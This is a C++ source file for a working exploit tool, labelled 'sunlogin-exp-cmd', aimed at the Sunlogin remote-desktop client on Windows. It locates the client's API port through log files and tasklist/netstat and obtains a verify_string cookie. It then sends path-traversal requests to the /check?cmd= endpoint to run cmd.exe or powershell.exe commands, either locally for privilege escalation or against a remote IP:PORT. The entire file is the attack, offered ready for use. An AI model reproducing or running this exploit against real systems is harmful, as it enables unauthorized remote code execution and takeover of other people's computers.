#include <iostream>
#include <string>
#include <io.h>
#include <dirent.h>
#include <regex>
#include <string>
#include <vector>
#include <sys/stat.h>
#include <fstream>
#include <string.h>
#include <httplib.h>

/*
#ifdef MINGW
#include "mingw.mutex.h"
#include "mingw.thread.h"
#else
#include <mutex>
#include <thread>
#endif


#include <winsock2.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")
*/



using namespace std;


void split(const std::string& str,
           std::vector<std::string>& tokens,
           const std::string delim = " ") {
    tokens.clear();

    auto start = str.find_first_not_of(delim, 0);
    auto position = str.find_first_of(delim, start);
    while (position != std::string::npos || start != std::string::npos) {

        tokens.emplace_back(std::move(str.substr(start, position - start)));
        start = str.find_first_not_of(delim, position);
        position = str.find_first_of(delim, start);
    }
}


std::vector<std::string> get_all_service_log_files(std::string sunloginDefaultLogPath, std::string logFilePrefix) {

        std::vector<std::string> serviceLogFiles;
        serviceLogFiles.clear();
        DIR *dp;
        struct dirent *dirp;
        std::regex serviceLogReg(logFilePrefix + ".*?", regex::icase);

//std::string sunloginDefaultLogPath = "C:/ProgramData/Oray/SunloginClient/log/";
    if (_access(sunloginDefaultLogPath.c_str(),0) != -1){
        cout << "sunlogin default log path exist!" << endl;

        //const std::string logFilePrefix = "sunlogin_service.";


        if ((dp = opendir(sunloginDefaultLogPath.c_str())) == NULL) {
            cout << "Can not open " << sunloginDefaultLogPath << endl;
            return serviceLogFiles;
        }

        cout << "Open " << sunloginDefaultLogPath << " successfully!" << endl;

        while ((dirp = readdir(dp)) != NULL){
            //cout << dirp->d_name << endl;
            //if (dirp->d_type == DT_REG){
                //cout << dirp->d_name << endl;
                if (regex_match(dirp->d_name, serviceLogReg)) {
                    //cout << dirp->d_name << endl;
                    string fullPath = sunloginDefaultLogPath + dirp->d_name;
                    serviceLogFiles.push_back(fullPath);
                    //cout << dirp->d_name << " " << dirp->d_ino << " " << dirp->d_off << " " << dirp->d_reclen << " " << dirp->d_type << endl;
                }
            //}
        }
        closedir(dp);
        return serviceLogFiles;
    }
    else{
        cout << "sunlogin default log path not exist!" << endl;
        return serviceLogFiles;
    }
}

int get_file_creation_time(string &filePath){
    struct _stat fileInfo;
    int creationTime;
    if(_stat(filePath.c_str(),&fileInfo)!=0){

        return -1;
    }
    creationTime = static_cast<int>(fileInfo.st_ctime);
    return creationTime;
}


string get_last_creat_log_file(std::vector<std::string> serviceLogFiles){


    int maxCreationTime = 0;
    int tmpCreationTime = 0;
    string lastCreateLogFile = "";

    for(int a = 0; a<serviceLogFiles.size(); ++a){
        //cout << serviceLogFiles[a] << endl;
        //cout << get_file_creation_time(serviceLogFiles[a]) << endl;
        tmpCreationTime = get_file_creation_time(serviceLogFiles[a]);
        if(tmpCreationTime>=maxCreationTime){
            maxCreationTime = tmpCreationTime;
            lastCreateLogFile = serviceLogFiles[a];
        }
    }

    cout << "maxCreationTime is: "<< maxCreationTime << endl;

    return lastCreateLogFile;


}

string match_port_in_log_file(string logData){

    regex portReg("tcp:0.0.0.0:(\\d+)");
    smatch portResultMatch;

    string thePort = "";

    if(regex_search(logData,portResultMatch,portReg)){
        thePort =  portResultMatch[1];

        //cout << thePort << endl;
    }
    else{
        cout << "no port match." << endl;
    }

    return thePort;
}


string get_sunlogin_vuln_api_port_from_log_file(string lastCreateLogFile){

    string sunloginVulnApiPort = "";
    string logData = "";

    char logDataBuffer[100000];

    ifstream infile;
    infile.open(lastCreateLogFile, ios::in);

    if(!infile.is_open()){

        cout << "Read the lastest log file failed." << endl;
        //return "failed";
    }

    while(infile.getline(logDataBuffer, sizeof(logDataBuffer))){
        //cout << logDataBuffer << endl;
        //strcat_s(logData,sizeof(logDataBuffer),logDataBuffer);
        logData = logData + logDataBuffer;

    }

    //cout << logDataBuffer << endl;

    //infile >> logData;
    //cout << logData << endl;

    infile.close();

    sunloginVulnApiPort = match_port_in_log_file(logData);

    cout << "sunloginVulnApiPort is " << sunloginVulnApiPort << endl;

    return sunloginVulnApiPort;

}



string get_cmd_result(char* cmd)
{
	char buffer[1024];
	string tmpResult = "";
	FILE * pipe = _popen(cmd, "r");
	if (!pipe)
	{
		return 0;
	}
	while (!feof(pipe))
	{
		if (fgets(buffer, sizeof(buffer), pipe))
		{

			//strcat_s(result, sizeof(buffer), buffer);
            //cout << buffer << endl;
            tmpResult = tmpResult + buffer;
		}
	}

	//result = tmpResult;

	//cout << tmpResult << endl;

	//printf("result is: %s",result);

	_pclose(pipe);

	return tmpResult;
}


string get_sunlogin_custom_last_log_file()
{

	string cmdResult = "";
	string customSunloginLogFilePath = "";

	cmdResult = get_cmd_result("for /r C:/ %i in (sunlogin_service.*.log) do @echo %i");

	if (cmdResult!="")
	{

        //cout << cmdResult << endl;

        regex lastTimeReg("sunlogin_service.(.*?).log");
        smatch lastTimeMatch;

        string::const_iterator iterStart = cmdResult.begin();
        string::const_iterator iterEnd = cmdResult.end();

        string logFileTime;
        int tmpDayLastest = 0;
        int tmpDayTime = 0;

        string lastDayTime = "";

        vector<string> logFileTimeVect;
        vector<int> lastestDayLogTime(20);


        while(regex_search(iterStart,iterEnd,lastTimeMatch,lastTimeReg)){

            logFileTime = lastTimeMatch[1];
            //cout << logFileTime << "\r\n";

            split(logFileTime,logFileTimeVect,"-");
            //for(int t=0;t<tokens.size();t++){
                //cout << tokens[0] << endl;

                tmpDayTime = atoi(logFileTimeVect[0].c_str());
                if(tmpDayTime>tmpDayLastest){
                    tmpDayLastest = tmpDayTime;
                }

            //}

            iterStart = lastTimeMatch[1].second;
        }

        lastDayTime = std::to_string(tmpDayLastest);
        //cout << lastDayTime << endl;

        regex secondsTimeReg("sunlogin_service." + lastDayTime + "-(.*?).log");
        smatch lastSecondsTimeMatch;

        string::const_iterator iterStart1 = cmdResult.begin();
        string::const_iterator iterEnd1 = cmdResult.end();

        string logFileTime1;
        int tmpSecondsLastest = 0;
        int tmpSecondsTime = 0;

        string lastSecondsTime = "";

        vector<string> tokens1;
        vector<int> lastestSecondsLogTime(20);


        while(regex_search(iterStart1,iterEnd1,lastSecondsTimeMatch,secondsTimeReg)){

            logFileTime1 = lastSecondsTimeMatch[1];
            //cout << logFileTime << "\r\n";

            //split(logFileTime1,tokens1,"-");
            //for(int t=0;t<tokens.size();t++){
                //cout << tokens[0] << endl;

                //tmpDayTime = atoi(tokens[0].c_str());
                tmpSecondsTime = atoi(logFileTime1.c_str());
                if(tmpSecondsTime>tmpSecondsLastest){
                    tmpSecondsLastest = tmpSecondsTime;
                }

            //}

            iterStart1 = lastSecondsTimeMatch[1].second;
        }
        lastSecondsTime = std::to_string(tmpSecondsLastest);
        //cout << lastSecondsTime << endl;

        string finalLastLogFile = ".*sunlogin_service." + lastDayTime + "-" + lastSecondsTime + ".log";

        regex finalLastTimeReg(finalLastLogFile);
        smatch finalLastestLogFile;
        regex_search(cmdResult,finalLastestLogFile,finalLastTimeReg);

        customSunloginLogFilePath = finalLastestLogFile[0];
        cout << "customSunloginLogFilePath is " << customSunloginLogFilePath << endl;

        //return customSunloginLogFile;
	}

	else
	{
		printf("Can not find sunlogin custom log file\n!");
		//return customSunloginLogFile;
	}

	return customSunloginLogFilePath;

}


string get_sunlogin_vuln_api_port_from_tasklist(){   //SunloginClient: green version.

    //char port[10];
    string port = "";
	string cmdResult = get_cmd_result("tasklist /svc | findstr SunloginClient");
	//string cmdResult = get_cmd_result("tasklist /svc | findstr Dns");

	if (cmdResult!="")
	{

		regex pidReg1(" ([0-9].*?) ");
		smatch pidMatch1;
        string::const_iterator iterStart2 = cmdResult.begin();
        string::const_iterator iterEnd2 = cmdResult.end();
        vector<string> sunloginPidVector;
        string sunloginPid = "";

		//regex_search(cmdResult, pidMatch, pidReg);
        while(regex_search(iterStart2,iterEnd2,pidMatch1,pidReg1)){
            sunloginPid = pidMatch1[1];
            cout << "SunloginClient's pid: " << sunloginPid << endl;
            sunloginPidVector.push_back(sunloginPid);

            iterStart2 = pidMatch1[1].second;
        }


		//char pid[10];
		//strcpy_s(pid, 10, pidMatch.str(1).c_str());
		//cout << "sunlogin pid: " << pid << endl;

		char getPortCmd[100];
        char* netstatFindstr;

        for(int v = 0; v<sunloginPidVector.size(); ++v){
            //getPortCmd = {""};
            netstatFindstr = "netstat -ano | findstr \"%s\" | findstr LISTENING | findstr 0.0.0.0 | findstr TCP";
            sprintf_s(getPortCmd, netstatFindstr, sunloginPidVector[v].c_str());

            //cout << "getportcmd: " << getPortCmd << endl;

        //char Buffer[4096] = { 0 };
            string cmdResult1 = get_cmd_result(getPortCmd);
            if (cmdResult1!="")
            {
                regex portReg1(" 0.0.0.0:(\\d+) ");
                smatch portMatch1;
                regex_search(cmdResult1, portMatch1, portReg1);

                //strcpy_s(port, 10, portMatch1.str(1).c_str());
                port = portMatch1[1];
                cout << "sunlogin vuln api port is: " << port << endl;

                return port;
            }
            else
            {
                //printf("[netstat -ano | findstr \" %s \" | findstr LISTENING | findstr 0.0.0.0] return empty!",pid);
                //return "failed";
                continue;
            }

        }


        printf("[netstat -ano | findstr pid | findstr LISTENING | findstr 0.0.0.0 | findstr TCP] can not get sunlogin vuln api port!");

    }
	else
	{
		printf("[tasklist /svc | findstr SunloginClient] return empty!");
		//return "failed";
	}

	return port;


}


string get_sunlogin_vuln_api_port_from_tasklist_1(){   //SunloginService: install version?

    //char port[10];
    string port = "";
	string cmdResult = get_cmd_result("tasklist /svc | findstr SunloginService");
	//string cmdResult = get_cmd_result("tasklist /svc | findstr Dns");
	if (cmdResult!="")
	{

		regex pidReg(" ([0-9].*?) ");
		smatch pidMatch;
		regex_search(cmdResult, pidMatch, pidReg);
		char pid[10];
		strcpy_s(pid, 10, pidMatch.str(1).c_str());
		cout << "SunloginService's pid: " << pid << endl;


		char getPortCmd[100];
        char* netstatFindstr = "netstat -ano | findstr \"%s\" | findstr LISTENING | findstr 0.0.0.0";
        sprintf_s(getPortCmd, netstatFindstr, pid);

        //char Buffer[4096] = { 0 };
        string cmdResult1 = get_cmd_result(getPortCmd);
        if (cmdResult1!="")
        {
            regex portReg1(" 0.0.0.0:(\\d+) ");
            smatch portMatch1;
            regex_search(cmdResult1, portMatch1, portReg1);

            //strcpy_s(port, 10, portMatch1.str(1).c_str());
            port = portMatch1.str(1);
            cout << "sunlogin vuln api port is: " << port << endl;

            return port;
        }
        else
        {
            printf("[netstat -ano | findstr \" %s \" | findstr LISTENING | findstr 0.0.0.0] return empty!",pid);
            //return "failed";
        }

    }
	else
	{
		printf("[tasklist /svc | findstr SunloginService] return empty!");
		//return "failed";
	}

	return port;


}




string get_verify_string(string ip,string port){

    string cid = "";

    cout << "http://"+ip+":"+port << endl;

    httplib::Client cli("http://"+ip+":"+port);
    if(auto rsp = cli.Get("/cgi-bin/rpc?action=verify-haras")){
        //if(rsp->status == 200){
            std::cout << rsp->body << std::endl;


            regex cidReg("verify_string\":\"(\\w+)?\"");
            smatch cidMatch;
            regex_search(rsp->body, cidMatch, cidReg);

            //char cid[100];
            //strcpy_s(cid, 100, cidMatch.str(1).c_str());
            cid = cidMatch.str(1);

            cout << "verify_string is " << cid << endl;

        //}

        //else{
        //    cout << "status code is not 200 , maybe something error." << endl;
        //}
    }else{
        auto err = rsp.error();
        cout << "get cid failed , error is: " << err << endl;
    }

    return cid;

}


string rce_by_check(string ip , string port,char* cmd2rce,string verifyString){

     string rceResult  = "";
     char rce[1024];

     //string argv[1] = "whoami";

    httplib::Client cli("http://"+ip+":"+port);

            httplib::Headers headers = {
					{ "Cookie", "CID="+verifyString }
				};

            //char* rceFormat = "/check?cmd=ping..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\\\system32\\\\cmd.exe /c %s";
            //char* rceFormat = "/check?cmd=ping..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\\\system32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe %s";
            //char* rceFormat = "/check?cmd=ping../../../../../../../../../windows/system32/WindowsPowerShell/v1.0/powershell.exe %s";
            string rceFormatString = "/check?cmd=ping..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\\\system32\\\\cmd.exe /c %s";
            char* rceFormat = new char[500];
            strcpy(rceFormat,rceFormatString.c_str());
            sprintf_s(rce, rceFormat, cmd2rce);
            cout << rce << endl;
            //char* rce = "";
            //rce = "/check?cmd=ping..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\\\system32\\\\cmd.exe+/c+" + cmd2rce;

            if(auto rsp1 = cli.Get(rce, headers)){
                cout << "execute cmd.exe......" << endl;
                //cout << (rsp1->body).c_str() << endl;
                rceResult = rsp1->body;
            }
            else{
                auto err1 = rsp1.error();
                cout << "execute cmd.exe failed. Error is: " << err1 << ". Now try to execute powershell.exe......" << endl;

                //char* rceFormat1 = "/check?cmd=ping../../../../../../../../../windows/system32/WindowsPowerShell/v1.0/powershell.exe %s";
                string rceFormat1String = "/check?cmd=ping../../../../../../../../../windows/system32/WindowsPowerShell/v1.0/powershell.exe %s";
                //char* rceFormat1 = "/check?cmd=ping..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\\\system32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe %s";
                char* rceFormat1 = new char[500];
                strcpy(rceFormat1,rceFormat1String.c_str());
                sprintf_s(rce,rceFormat1,cmd2rce);
                cout << rce << endl;
                //rce = "/check?cmd=ping../../../../../../../../../windows/system32/WindowsPowerShell/v1.0/powershell.exe+whoami";

                if(auto rsp2 = cli.Get(rce, headers)){
                    cout << "executing powershell.exe......" << endl;
                    //cout << (rsp2->body).c_str() << endl;
                    rceResult = rsp2->body;
                }
                else{
                    auto err2 = rsp2.error();

                    cout << "execute powershell.exe failed. Error is: " <<  err2 << endl;
                }
            }

    return rceResult;

}



int main(int argc, char* argv[])
{


    //cout << "Hello world! sunlogin exp dev test." << endl;


    //string portest = "18899";
    string port = "";
    string ip = "127.0.0.1";
    string verifyString = "";
    string rceResult = "";

    if (argc <= 1 || argc >= 4)
	{
	    printf("sunlogin-exp-cmd\nAuthor:LSA\nDescription:sunlogin rce(/check?cmd=)\n");
		printf("Usage:\nLPE: %s COMMAND\nRCE: %s IP:PORT COMMAND\n", argv[0],argv[0]);

	}

	if(argc == 2){
        printf("Using LPE mode......\n");


    std::vector<std::string> serviceLogFiles;
    std::string sunloginDefaultLogPath = "C:/ProgramData/Oray/SunloginClient/log/";
    std::string sunloginDefaultLogPath1 = "C:/Program Files/Oray/SunLogin/SunloginClient/";
    const std::string logFilePrefix = "sunlogin_service\\.";
    string lastCreateLogFile = "";

    serviceLogFiles = get_all_service_log_files(sunloginDefaultLogPath, logFilePrefix);


    if(serviceLogFiles.empty()){
        cout << "serviceLogFiles return empty , now try sunloginDefaultLogPath1......" << endl;
        serviceLogFiles = get_all_service_log_files(sunloginDefaultLogPath1, logFilePrefix);

        if(serviceLogFiles.empty()){
                cout << "serviceLogFiles return empty too , now try to find custom sunlogin log path......" << endl;
                string customLogPath = get_sunlogin_custom_last_log_file();

                if(customLogPath!=""){
                    lastCreateLogFile = customLogPath;

                }
                else{
                    cout << "customLogPath return empty." << endl;
                    return -1;
                }

        }
        else{
            cout << "get_all_service_log_files successfully ! Sunlogin log path is sunloginDefaultLogPath1." << endl;

        }

    }
    else{

         cout << "get_all_service_log_files successfully ! Sunlogin log path is sunloginDefaultLogPath." << endl;
    }




    if(lastCreateLogFile==""){
        lastCreateLogFile = get_last_creat_log_file(serviceLogFiles);
    }

    cout << "last creat service log file is " << lastCreateLogFile << endl;

    port = get_sunlogin_vuln_api_port_from_log_file(lastCreateLogFile);

    if(port==""){
        cout << "port return empty , now try to find port from tasklist." << endl;
        port = get_sunlogin_vuln_api_port_from_tasklist();

        if(port==""){
            cout << "port return empty , now try to find port from tasklist_1." << endl;
            port = get_sunlogin_vuln_api_port_from_tasklist_1();

            if(port==""){
                cout << "port still return empty , exploit failed." << endl;
                return -1;
            }
        }
    }

    //portest = "18899";
    //ip = "127.0.0.1";
    //verifyString = "";
    //rceResult = "";

    //char* cmd2rce = "whoami";
    char* cmd2rce = new char[50];
    cmd2rce = argv[1];
    //strcpy_s(cmd2rce,argv[1]);
    //cout << cmd2rce << endl;
    verifyString = get_verify_string(ip,port);

    if(verifyString==""){
        cout << "Warning: verify_string is empty!" << endl;
    }

    rceResult = rce_by_check(ip,port,cmd2rce,verifyString);

    cout << "rceResult>" << rceResult << endl;


	}

    if(argc == 3){
        printf("Using RCE mode......\n");
        vector<string> ipWithPort;

        string::size_type idx;
        string a1 = ":";
        string argv1 = argv[1];
        //idx = argv[1].find(a1);
        idx = argv1.find(a1);
        if(idx == string::npos){
            cout << argv[1] << " invalid! Please use IP:PORT." << endl;
            return -1;
        }

        split(argv[1],ipWithPort,":");
        port = ipWithPort[1];
        ip = ipWithPort[0];
        verifyString = "";
        rceResult = "";
        char* cmd2rce = new char[50];
        //cmd2rce = "whoami".c_str();
        cmd2rce = argv[2];

        verifyString = get_verify_string(ip,port);

        if(verifyString==""){
            cout << "Warning: verify_string is empty." << endl;
        }

        rceResult = rce_by_check(ip,port,cmd2rce,verifyString);

        cout << "rceResult>" << rceResult << endl;


	}



    //get_sunlogin_vuln_api_port_from_tasklist();

    return 0;
}
